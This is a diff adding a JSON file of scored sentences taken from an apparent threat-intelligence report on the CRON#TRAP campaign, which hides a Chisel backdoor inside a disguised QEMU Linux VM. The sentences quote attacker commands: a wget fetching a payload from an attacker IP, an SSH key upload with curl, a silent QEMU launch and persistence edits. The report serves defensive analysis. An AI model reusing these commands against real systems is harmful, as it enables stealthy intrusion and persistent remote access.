+        "sentence": "The entirety of the start.bat code can be seen in the image below.",
+        "score": 0.371
+      },
+      {
+        "sentence": "Second, the script executes the QEMU process and command line to start the emulated Linux environment.",
+        "score": 0.4828
+      },
+      {
+        "sentence": "The process qemu.exe was renamed to fontdiag.exe by the attacker prior to delivery of the phishing lure.",
+        "score": 0.4284
+      },
+      {
+        "sentence": "Figure 1: contents of start.bat Lure document The image is executed by the explorer.exe process.",
+        "score": 0.4476
+      },
+      {
+        "sentence": "Since the image is hosted on a remote server via HTTPS, the user’s default browser would open and display the image.",
+        "score": 0.4177
+      },
+      {
+        "sentence": "The image is a simple server error message.",
+        "score": 0.3088
+      },
+      {
+        "sentence": "While there is technically no error, rather an image of the error, the attackers would hope this would be glanced over by the user.",
+        "score": 0.3412
+      },
+      {
+        "sentence": "The image was hosted on a public site: hxxps://forum.hestiacp[.]com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png Figure 2: Lure image (masquerading as a server error) QEMU: Mount and execute As mentioned earlier, the QEMU process was renamed and executed using the start.bat script.",
+        "score": 0.6162
+      },
+      {
+        "sentence": "This QEMU process is the legitimate process and is digitally signed using a valid digital certificate.",
+        "score": 0.3839
+      },
+      {
+        "sentence": "The Linux box was executed using the following command: START /B %HOMEPATH%\\datax\\data\\fontdiag.exe -drive file=%HOMEPATH%\\datax\\data\\tc.img -nographic & The use of the “-nographic” parameter means that the Linux virtual environment will run silently in the background.",
+        "score": 0.5824
+      },
+      {
+        "sentence": "For the sake of analysis, we removed this to interact with the OS.",
+        "score": 0.5565
+      },
+      {
+        "sentence": "At this stage, we can interact with the OS.",
+        "score": 0.4042
+      },
+      {
+        "sentence": "PivotBox: Exploring the attacker’s Linux environment As seen in the image below, the MOTD banner displays “PivotBox” as well as an options command.",
+        "score": 0.4807
+      },
+      {
+        "sentence": "These appear to be custom-set by the attacker as we witnessed many edits to /etc/motd and the user’s .ashrc file (see history section below).",
+        "score": 0.4063
+      },
+      {
+        "sentence": "This file is the user’s profile configuration for the Almquist Shell (often referred to as ash), a lightweight shell commonly used in Unix-like operating systems.",
+        "score": 0.4981
+      },
+      {
+        "sentence": "The options command yielded two “special commands” get-host-shell and get-host-user which allow for interacting with the host.",
+        "score": 0.3763
+      },
+      {
+        "sentence": "Figure 3: Screenshot of “PivotBox” – custom Tiny Core Linux QEMU instance The get-host-shell alias created by the attacker attempts to spawn an interactive shell on the host machine by initiating an SSH connection.",
+        "score": 0.4725
+      },
+      {
+        "sentence": "The command uses information stored in a QEMU-specific file, /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw , which contains user context information.",
+        "score": 0.4142
+      },
+      {
+        "sentence": "The command points to IP 10.0.2.2, a common IP for host-guest communication in virtualized environments, which serves as an alias to the host’s loopback interface.",
+        "score": 0.4392
+      },
+      {
+        "sentence": "Exploring PivotBox’s command history Linux by default will store a record of all commands executed by the user inside the user’s profile directory.",
+        "score": 0.339
+      },
+      {
+        "sentence": "As the ash shell was used, we were fortunate to find that we had obtained a command record of the creation of the PivotBox Linux image.",
+        "score": 0.4779
+      },
+      {
+        "sentence": "Typically good OPSEC (operational security) would entail clearing the history, especially if the image would be deployed elsewhere.",
+        "score": 0.4868
+      },
+      {
+        "sentence": "Figure 4: Screenshot of a portion of the attacker’s .ash_history file While there’s a lot to unpack, let’s take a look at some of the highlights that we discovered.",
+        "score": 0.4521
+      },
+      {
+        "sentence": "The .ash_history file provided us with a series of steps that suggest an advanced attempt at persistence by creating this stealthy toolkit within its own environment Here’s a breakdown of the key actions: Network Testing & Initial Reconnaissance Commands: ping google.com and wget Purpose: Confirm network connectivity and attempt to fetch remote resources (likely staging or payload files) from both IP-based URLs (192.168.160.143) and GitHub-hosted content.",
+        "score": 0.4489
+      },
+      {
+        "sentence": "The private 192 address would appear to be from the attacker’s testing infrastructure.",
+        "score": 0.3753
+      },
+      {
+        "sentence": "Tool Installation and Preparation Commands: tce-load -wi [tool] Purpose: This Tiny Core Linux (tce ) command installs tools such as vim, file, and openssh, indicating the attacker is preparing the environment for modifications, file analysis, and SSH access.",
+        "score": 0.5564
+      },
+      {
+        "sentence": "Implication: The installation of openssh hints at establishing persistent remote access.",
+        "score": 0.4199
+      },
+      {
+        "sentence": "Payload Manipulation and Execution Commands: ./crondx, chmod +x crondx, ln -s /lib /lib64 Purpose: Execution of crondx, potentially after renaming or replacing files downloaded from the attacker’s server or GitHub repositories.",
+        "score": 0.4601
+      },
+      {
+        "sentence": "Linking /lib to /lib64 suggests an attempt to bypass environment dependencies.",
+        "score": 0.3973
+      },
+      {
+        "sentence": "Observations: wget http://192.168.160.143:8000/crondx downloads a file to be used as crondx, later executed multiple times with variations (./crondx, /bin/bash ./crondx ).",
+        "score": 0.342
+      },
+      {
+        "sentence": "Regular use of file analysis (file crondx) indicates testing or validation of each download.",
+        "score": 0.4975
+      },
+      {
+        "sentence": "Configuration Persistence and Privilege Escalation Commands: sudo vim /opt/bootlocal.sh, filetool.sh -b Purpose: Editing /opt/bootlocal.sh is used to persist changes across reboots.",
+        "score": 0.5543
+      },
+      {
+        "sentence": "Using filetool.sh -b is a method to save changes in Tiny Core Linux’s file structure, ensuring that any modifications to system configuration are retained.",
+        "score": 0.4954
+      },
+      {
+        "sentence": "Persistence: By modifying and backing up configurations, it ensures that crondx will be reloaded or re-executed on each start of the QEMU instance.",
+        "score": 0.5773
+      },
+      {
+        "sentence": "SSH Key Manipulation for Remote Access Commands: ssh-keygen -t rsa, curl --upload-file ~/.ssh/id_rsa.pub Purpose: By generating an SSH key and uploading the public key, the attacker aims to access the target machine without a password.",
+        "score": 0.3193
+      },
+      {
+        "sentence": "Implication: This is a classic persistence technique, allowing re-entry into the environment by using SSH keys uploaded to a known location.",
+        "score": 0.4185
+      },
+      {
+        "sentence": "File and Environment Management Commands: tce-load -i 7z, unzip, 7z x [archive.zip] Purpose: Frequent use of archive tools shows a method for handling large file transfers or additional payloads while maintaining an organized working environment.",
+        "score": 0.5854
+      },
+      {
+        "sentence": "The repeated downloads and extractions of files (such as resolvd.zip, ch.zip) likely contain supplementary payloads or configurations.",
+        "score": 0.4415
+      },
+      {
+        "sentence": "Implication: This allows the attacker to adjust actions based on system architecture or available space, tailoring commands to the target.",
+        "score": 0.4548
+      },
+      {
+        "sentence": "Potential Exfiltration or Command Control Channels Commands: wget hxxps://free[.]keep.sh Purpose: Using a free file-sharing service could serve as an exfiltration channel for SSH keys or other sensitive files.",
+        "score": 0.3636
+      },
+      {
+        "sentence": "Summary of the command history: Like a game of chess, the attackers prepped their environment with a strategy in mind.",
+        "score": 0.4112
+      },
+      {
+        "sentence": "They systematically installed, tested, and executed multiple payloads and configurations, each preparing for the next phase.",
+        "score": 0.4
+      },
+      {
+        "sentence": "The use of bootlocal.sh and SSH keys indicates they’re aiming for a reliable presence on the machine.",
+        "score": 0.4278
+      },
+      {
+        "sentence": "There were several times where they downloaded crondx files from various URLs.",
+        "score": 0.3347
+      },
+      {
+        "sentence": "The reasons for this were unknown, however we speculate that they could have been modifying the payload until it functions as expected.",
+        "score": 0.4443
+      },
+      {
+        "sentence": "Analysis of crondx (Chisel) The binary file that gets executed at the startup of the Linux QEMU instance is located at /home/tc/crondx.",
+        "score": 0.5627
+      },
+      {
+        "sentence": "The file is a 64-bit ELF executable compiled in Go (golang).",
+        "score": 0.4635
+      },
+      {
+        "sentence": "Some of the high level details can be found below.",
+        "score": 0.384
+      },
+      {
+        "sentence": "Figure 5: File overview of crondx Upon closer inspection, the binary appears to be a pre-configured Chisel client designed to connect to a remote Command and Control (C2) server at 18.208.230[.]174 via websockets.",
+        "score": 0.4296
+      },
+      {
+        "sentence": "In this case, however, the attackers opted to hard-code these parameters directly into the binary, removing the need for external configuration.",
+        "score": 0.3925
+      },
+      {
+        "sentence": "This customization is straightforward due to Chisel’s open-source nature and allows the binary to execute with minimal visibility, making detection more challenging.",
+        "score": 0.5927
+      },
+      {
+        "sentence": "According to Chisel’s GitHub, it is “…a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.",
+        "score": 0.3035
+      },
+      {
+        "sentence": "Single executable including both client and server.",
+        "score": 0.4332
+      },
+      {
+        "sentence": "Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.” Chisel’s design makes it particularly effective for creating covert communication channels and tunneling through firewalls, often under the radar of network monitoring tools.",
+        "score": 0.4573
+      },
+      {
+        "sentence": "The attackers’ approach effectively transforms this Chisel client into a full backdoor, enabling remote command and control traffic to flow in and out of the Linux environment.",
+        "score": 0.4434
+      },
+      {
+        "sentence": "This setup provides them with persistent, encrypted access to the compromised system that would allow them to manage additional payloads or exfiltrate data at will.",
+        "score": 0.5009
+      },
+      {
+        "sentence": "Wrapping up… The CRON#TRAP campaign demonstrates a sophisticated and novel approach to compromising systems through a combination of phishing, emulated environments, and stealthy pre-configured tunneling.",
+        "score": 0.5444
+      },
+      {
+        "sentence": "What makes this campaign so interesting is the fact that it begins with a rather standard sequence of events, a phishing lure, leading to the download of a large zip file containing a malicious .lnk shortcut.",
+        "score": 0.3055
+      },
+      {
+        "sentence": "However, things take a dramatic turn once code execution begins.",
+        "score": 0.3432
+      },
+      {
+        "sentence": "PowerShell is used to kick off a chain of events that lead to the starting of an entire emulated Linux environment using a disguised QEMU executable.",
+        "score": 0.6039
+      },
+      {
+        "sentence": "This emulated Linux environment enables the attacker to operate outside the visibility of traditional antivirus solutions.",
+        "score": 0.6377
+      },
+      {
+        "sentence": "Within this environment, a highly customized setup unfolds.",
+        "score": 0.5766
+      },
+      {
+        "sentence": "The emulated system includes a crondx (Chisel) binary, a tunneling tool commonly used for passing data covertly through firewalls.",
+        "score": 0.5023
+      },
+      {
+        "sentence": "The Chisel client is pre-configured with hard-coded parameters, allowing it to connect automatically to a remote Command and Control (C2) server via websockets, providing attackers with a persistent backdoor into the environment.",
+        "score": 0.3376
+      },
+      {
+        "sentence": "The attacker’s presence in the emulated Linux system is further reinforced by various persistence techniques.",
+        "score": 0.6151
+      },
+      {
+        "sentence": "Through modifications in startup scripts and the use of SSH keys, they ensure continued access even after reboots.",
+        "score": 0.3985
+      },
+      {
+        "sentence": "Command aliases, such as get-host-shell and get-host-user , allow them to interact directly with the host machine from within the isolated QEMU environment, a feature likely intended to facilitate lateral movement or data exfiltration.",
+        "score": 0.5262
+      },
+      {
+        "sentence": "The .ash_history file reveals a trail of actions taken to install tools, gather system information, and download additional payloads, showcasing a modular and adaptive attack method.",
+        "score": 0.4475
+      },
+      {
+        "sentence": "The attacker’s reliance on legitimate software like QEMU and Chisel adds an additional layer of evasion, as these tools are unlikely to trigger alerts in many environments.",
+        "score": 0.5661
+      },
+      {
+        "sentence": "Securonix recommendations - As this campaign likely started using phishing emails, avoid downloading files or attachments from external sources, especially if the source was unsolicited.",
+        "score": 0.3007
+      },
+      {
+        "sentence": "Common file types include zip, rar, iso, and pdf.",
+        "score": 0.3673
+      },
+      {
+        "sentence": "Zip files, sometimes password-protected, were used during this campaign. - Monitor common malware staging directories, especially script-related activity in world-writable directories.",
+        "score": 0.4611
+      },
+      {
+        "sentence": "In the case of this campaign the threat actors staged their QEMU instance from the user’s home directory at: %HOME%\\datax . - Monitor for the use of legitimate software being executed from unusual locations. - We strongly recommend deploying robust endpoint logging capabilities to aid in PowerShell detections.",
+        "score": 0.616
+      },
+      {
+        "sentence": "This includes leveraging additional process-level logging such as Sysmon and PowerShell logging for additional log detection coverage. - Securonix customers can scan endpoints using the Securonix hunting queries below.",
+        "score": 0.4279
+      }
+    ]
+  }
+}
